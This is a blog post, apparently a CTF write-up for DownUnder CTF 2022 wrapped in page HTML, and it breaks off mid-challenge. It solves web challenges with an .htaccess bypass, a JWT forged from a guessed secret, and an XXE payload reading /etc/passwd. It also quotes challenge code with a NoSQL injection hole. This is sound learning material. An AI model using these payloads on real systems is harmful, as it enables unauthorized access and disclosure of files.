@@ -1,0 +1,299 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Leihehe"><meta name="copyright" content="Leihehe"><meta name="generator" content="Hexo 5.4.2"><meta name="theme" content="hexo-theme-yun"><title>DownUnder CTF 2022 writeup | LeiH - Blog</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.25/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_dxory92pb0h.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".post-content img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-okaidia.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="icon" type="image/png" href="/logo.png"><link rel="mask-icon" href="/logo.png" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="preload" href="/js/prism.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
+    const Yun = window.Yun || {};
+    window.CONFIG = {"hostname":"leihehe.top","root":"/","title":["LeiH's","Blog"],"version":"1.7.0","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","local_search":{"path":"/search.xml"},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
+  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><script src="/js/prism.js"></script><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap"><script>(function(){
+  var bp = document.createElement('script');
+  var curProtocol = window.location.protocol.split(':')[0];
+  if (curProtocol === 'https') {
+    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else {
+    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(bp, s);
+})();</script><!-- Google Tag Manager --><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-M9KWR9L');</script><!-- End Google Tag Manager --><meta name="description" content="IntroductionIt was the second time I participated in CTF, this time I got 4 challenges solved.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DownUnder CTF 2022 writeup">
+<meta property="og:url" content="https://leihehe.top/2022/09/26/DownUnder-CTF-2022-writeup/index.html">
+<meta property="og:site_name" content="LeiH - Blog">
+<meta property="og:description" content="IntroductionIt was the second time I participated in CTF, this time I got 4 challenges solved.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220926113949.png">
+<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220926114349.png">
+<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220926114520.png">
+<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220926114603.png">
+<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220926114801.png">
+<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220926115318.png">
+<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220926115546.png">
+<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220926120808.png">
+<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220926131752.png">
+<meta property="article:published_time" content="2022-09-25T23:58:14.000Z">
+<meta property="article:modified_time" content="2022-09-26T04:39:30.646Z">
+<meta property="article:author" content="Leihehe">
+<meta property="article:tag" content="Web Security">
+<meta property="article:tag" content="Write-up">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220926113949.png"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Leihehe"><img width="96" loading="lazy" src="/image/avatar.png" alt="Leihehe"></a><div class="site-author-name"><a href="/about/">Leihehe</a></div><span class="site-name">LeiH - Blog</span><sub class="site-subtitle"></sub><div class="site-desciption">我该说些什么呢？</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="My Home"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/about/"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-user-line"></use></svg></span></a></div><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">46</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">20</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">26</span></a></div><a class="site-state-item hty-icon-button" href="/about/#comment" title="留言板"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-clipboard-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/leihehehe" title="GitHub" target="_blank" style="color:#6e5494"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:hslscarlett@gmail.com" title="E-Mail" target="_blank" style="color:#8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="友情链接" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-genderless-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#helicoptering-htaccess-bypass"><span class="toc-number">2.1.</span> <span class="toc-text">helicoptering (.htaccess bypass)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Treasure-Hunt-JWT-key-guess"><span class="toc-number">2.2.</span> <span class="toc-text">Treasure Hunt( JWT key guess)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dyslexxec-XXE-attack"><span class="toc-number">2.3.</span> <span class="toc-text">dyslexxec(XXE attack)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#noteworthy-NoSQL-blind-SQL-injection"><span class="toc-number">2.4.</span> <span class="toc-text">noteworthy(NoSQL blind SQL injection)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#no-symlink-Symlink-and-file-permission-trick"><span class="toc-number">2.5.</span> <span class="toc-text">no-symlink(Symlink and file permission trick)</span></a></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="https://leihehe.top/2022/09/26/DownUnder-CTF-2022-writeup/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Leihehe"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="LeiH - Blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">DownUnder CTF 2022 writeup</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="Created: 2022-09-26 09:58:14" itemprop="dateCreated datePublished" datetime="2022-09-26T09:58:14+10:00">2022-09-26</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="Word count in article"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-file-word-line"></use></svg></span> <span title="Word count in article">1.4k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="Reading time"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-timer-line"></use></svg></span> <span title="Reading time">8m</span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/Web-Security/" style="--text-color:#F4645F" itemprop="url" rel="index"><span itemprop="text">Web Security</span></a></span> > <span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/Web-Security/CTF/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">CTF</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/Web-Security/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">Web Security</span></a><a class="tag-item" href="/tags/Write-up/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">Write-up</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#0078E7;"><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>It was the second time I participated in CTF, this time I got 4 challenges solved. </p>
+<span id="more"></span>
+
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="helicoptering-htaccess-bypass"><a href="#helicoptering-htaccess-bypass" class="headerlink" title="helicoptering (.htaccess bypass)"></a>helicoptering (.htaccess bypass)</h2><p>This challenge is about bypassing the restrictions of <code>.htaccess</code> file.</p>
+<p>The first <code>.htaccess</code> file：</p>
+<pre class="line-numbers language-htaccess" data-language="htaccess"><code class="language-htaccess">RewriteEngine On
+RewriteCond %&#123;HTTP_HOST&#125; !^localhost$
+RewriteRule &quot;.*&quot; &quot;-&quot; [F]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>Solution:</strong> Change the header <code>host</code> to <code>localhost</code></p>
+<p>The second <code>.htaccess</code> file：</p>
+<pre class="line-numbers language-htaccess" data-language="htaccess"><code class="language-htaccess">RewriteEngine On
+RewriteCond %&#123;THE_REQUEST&#125; flag
+RewriteRule &quot;.*&quot; &quot;-&quot; [F]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>Since <code>%&#123;THE_REQUEST&#125;</code> is getting the full HTTP Request Line, like <code>GET /two/flag.txt HTTP/1.1</code>, and it will check if the word <code>flag</code> is in there, we need to encode some charactors using <strong>ascii</strong> to bypass the restriction.</p>
+<p><strong>Solution:</strong> Change the request <code>flag.txt</code> to <code>f%6clag.txt</code> (<code>%6c</code> is the ascii of <code>l</code>)</p>
+<h2 id="Treasure-Hunt-JWT-key-guess"><a href="#Treasure-Hunt-JWT-key-guess" class="headerlink" title="Treasure Hunt( JWT key guess)"></a>Treasure Hunt( JWT key guess)</h2><p>This challenge asked us to find out the <code>treasure</code></p>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220926113949.png" loading="lazy"></p>
+<p>On Register page, there’s a Treasures field, which means we would need to find out the <code>treasures</code> field for some account.</p>
+<p>After registering an account, I got the JWT token.</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Set-Cookie</span><span class="token punctuation">:</span> <span class="token header-value">access_token_cookie=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY2NDE1NjU0NywianRpIjoiNTMxNDAzMzUtZTA5Yi00NDM3LTgzZjQtM2NkMjcyNTAyMDQ2IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6MzksIm5iZiI6MTY2NDE1NjU0NywiZXhwIjoxNjY0MTU3NDQ3fQ.Voo-9ZzfnKfLDoGrXSNHkIqzw2lJ9nKhI2VBvT_uOT0</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>Using <code>jwo.io</code>:</p>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220926114349.png" loading="lazy"></p>
+<p>I spent a lot of time to crack this secret, but I found the secret was <code>onepiece</code> as it mentioned a lot here.</p>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220926114520.png" loading="lazy"></p>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220926114603.png" loading="lazy"></p>
+<p>After copying the token, I used it to access the profile page again, it did not give any errors to me.</p>
+<p>So, the secret is correct. Then I change the <code>sub</code> field to <code>1</code> to generate a new JWT token.</p>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220926114801.png" loading="lazy"></p>
+<h2 id="dyslexxec-XXE-attack"><a href="#dyslexxec-XXE-attack" class="headerlink" title="dyslexxec(XXE attack)"></a>dyslexxec(XXE attack)</h2><p>According to the name of the challenge, I could guess that it was a challenge related to XXE attack.</p>
+<p>Go to upload page, and we can find that we can upload a <code>xlsm</code> file, as there was a <code>xlsm</code> file attached.</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/upload/testPandasImplementation"</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"upload.html"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220926115318.png" loading="lazy"></p>
+<p>Then I tried to upload this <code>xslm</code> file,<img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220926115546.png" loading="lazy"></p>
+<p>It was actually fetching file information from the <code>xlsm</code> file.</p>
+<p>In <code>Dockerfile</code>: </p>
+<pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">RUN echo &#39;DUCTF&#123;test_flag&#125;:x:1001:1001::&#x2F;tmp:&#x2F;bin&#x2F;false&#39; &gt;&gt; &#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>So we need to get the flag from <code>/etc/passwd</code></p>
+<p>In <code>app.py</code>, we could see the uploaded file would be unzipped, and a <code>WORKBOOK</code> file was extracted from it,.</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">WORKBOOK <span class="token operator">=</span> <span class="token string">"xl/workbook.xml"</span>
+
+<span class="token keyword">def</span> <span class="token function">extractWorkbook</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> outfile<span class="token operator">=</span><span class="token string">"xml"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">with</span> ZipFile<span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">zip</span><span class="token punctuation">:</span>
+        <span class="token builtin">zip</span><span class="token punctuation">.</span>extract<span class="token punctuation">(</span>WORKBOOK<span class="token punctuation">,</span> outfile<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>so I rename the file to <code>fizzbuzz.rar</code> and then unzipped it, then we could find the file <code>xl/workbook.xml</code></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">findInternalFilepath</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        prop <span class="token operator">=</span> <span class="token boolean">None</span>
+        parser <span class="token operator">=</span> etree<span class="token punctuation">.</span>XMLParser<span class="token punctuation">(</span>load_dtd<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> resolve_entities<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token comment">#here's the issue, it allows to resolve entities -> XXE attack is allowed</span>
+        tree <span class="token operator">=</span> etree<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>filename<span class="token punctuation">,</span> parser<span class="token operator">=</span>parser<span class="token punctuation">)</span>
+        root <span class="token operator">=</span> tree<span class="token punctuation">.</span>getroot<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        internalNode <span class="token operator">=</span> root<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">".//&#123;http://schemas.microsoft.com/office/spreadsheetml/2010/11/ac&#125;absPath"</span><span class="token punctuation">)</span><span class="token comment">#here trying to find the parent node</span>
+        <span class="token keyword">if</span> internalNode <span class="token operator">!=</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+            prop <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+                <span class="token string">"Fieldname"</span><span class="token punctuation">:</span><span class="token string">"absPath"</span><span class="token punctuation">,</span>
+                <span class="token string">"Attribute"</span><span class="token punctuation">:</span>internalNode<span class="token punctuation">.</span>attrib<span class="token punctuation">[</span><span class="token string">"url"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+                <span class="token string">"Value"</span><span class="token punctuation">:</span>internalNode<span class="token punctuation">.</span>text <span class="token comment">#it's trying to get value of the tag</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token keyword">return</span> prop
+
+    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"couldnt extract absPath"</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span> <span class="token boolean">None</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Edit the <code>workbook.xml</code>, add a system entity and put inside the <code>x15ac:absPath</code> tag.</p>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; standalone&#x3D;&quot;yes&quot;?&gt;
+&lt;!DOCTYPE root [
+    &lt;!ENTITY test SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;
+]&gt;
+&lt;root&gt;
+&lt;!- ..... --&gt;
+            &lt;mc:Choice Requires&#x3D;&quot;x15&quot;&gt;
+                &lt;!-- &lt;x15ac:absPath url&#x3D;&quot;&#x2F;User&#x2F;shared&quot; xmlns:x15ac&#x3D;&quot;http:&#x2F;&#x2F;schemas.microsoft.com&#x2F;office&#x2F;spreadsheetml&#x2F;2010&#x2F;11&#x2F;ac&quot; &#x2F;&gt; --&gt;
+                &lt;x15ac:absPath url&#x3D;&quot;&#x2F;User&#x2F;shared&quot; xmlns:x15ac&#x3D;&quot;http:&#x2F;&#x2F;schemas.microsoft.com&#x2F;office&#x2F;spreadsheetml&#x2F;2010&#x2F;11&#x2F;ac&quot; &gt;
+                    &amp;test;
+            &lt;&#x2F;x15ac:absPath&gt;
+            &lt;&#x2F;mc:Choice&gt;
+&lt;!- ..... --&gt;
+&lt;&#x2F;root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Again, zip it, and change the suffix to <code>xlsm</code>.</p>
+<p>You will see the flag after uploading it.</p>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220926120808.png" loading="lazy"></p>
+<h2 id="noteworthy-NoSQL-blind-SQL-injection"><a href="#noteworthy-NoSQL-blind-SQL-injection" class="headerlink" title="noteworthy(NoSQL blind SQL injection)"></a>noteworthy(NoSQL blind SQL injection)</h2><p>I thought this was a challenge related to prototype pollution :(</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> admin <span class="token operator">=</span> <span class="token keyword">await</span> User<span class="token punctuation">.</span><span class="token function">findOne</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">username</span><span class="token operator">:</span> <span class="token string">'admin'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>admin<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    admin <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">username</span><span class="token operator">:</span> <span class="token string">'admin'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+    <span class="token keyword">await</span> admin<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">let</span> note <span class="token operator">=</span> <span class="token keyword">await</span> Note<span class="token punctuation">.</span><span class="token function">findOne</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">noteId</span><span class="token operator">:</span> <span class="token number">1337</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>note<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">const</span> <span class="token constant">FLAG</span> <span class="token operator">=</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">FLAG</span> <span class="token operator">||</span> <span class="token string">'DUCTF&#123;test_flag&#125;'</span>
+    note <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Note</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">owner</span><span class="token operator">:</span> admin<span class="token punctuation">.</span>_id<span class="token punctuation">,</span> <span class="token literal-property property">noteId</span><span class="token operator">:</span> <span class="token number">1337</span><span class="token punctuation">,</span> <span class="token literal-property property">contents</span><span class="token operator">:</span> <span class="token constant">FLAG</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+    <span class="token keyword">await</span> note<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    admin<span class="token punctuation">.</span>notes<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>note<span class="token punctuation">)</span>
+    <span class="token keyword">await</span> admin<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Obviously, we need to get the content of Note(id 1337), but it would failed unless we got an <code>admin</code> permission.</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/edit'</span><span class="token punctuation">,</span> ensureAuthed<span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">let</span> q <span class="token operator">=</span> req<span class="token punctuation">.</span>query
+    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">'noteId'</span> <span class="token keyword">in</span> q <span class="token operator">&amp;&amp;</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>q<span class="token punctuation">.</span>noteId<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">NaN</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"no problem with noteId"</span><span class="token punctuation">)</span>
+            <span class="token keyword">const</span> note <span class="token operator">=</span> <span class="token keyword">await</span> Note<span class="token punctuation">.</span><span class="token function">findOne</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span>
+            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"no problem with finding Note"</span><span class="token punctuation">)</span>
+
+            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>note<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">isLoggedIn</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token literal-property property">message</span><span class="token operator">:</span> <span class="token string">'Note does not exist!'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+            <span class="token punctuation">&#125;</span>
+
+            <span class="token keyword">if</span><span class="token punctuation">(</span>note<span class="token punctuation">.</span>owner<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> req<span class="token punctuation">.</span>user<span class="token punctuation">.</span>userId<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//here it will check the owner</span>
+                <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">isLoggedIn</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token literal-property property">message</span><span class="token operator">:</span> <span class="token string">'You are not the owner of this note!'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+            <span class="token punctuation">&#125;</span>
+
+            res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'edit'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">isLoggedIn</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token literal-property property">noteId</span><span class="token operator">:</span> note<span class="token punctuation">.</span>noteId<span class="token punctuation">,</span> <span class="token literal-property property">contents</span><span class="token operator">:</span> note<span class="token punctuation">.</span>contents <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
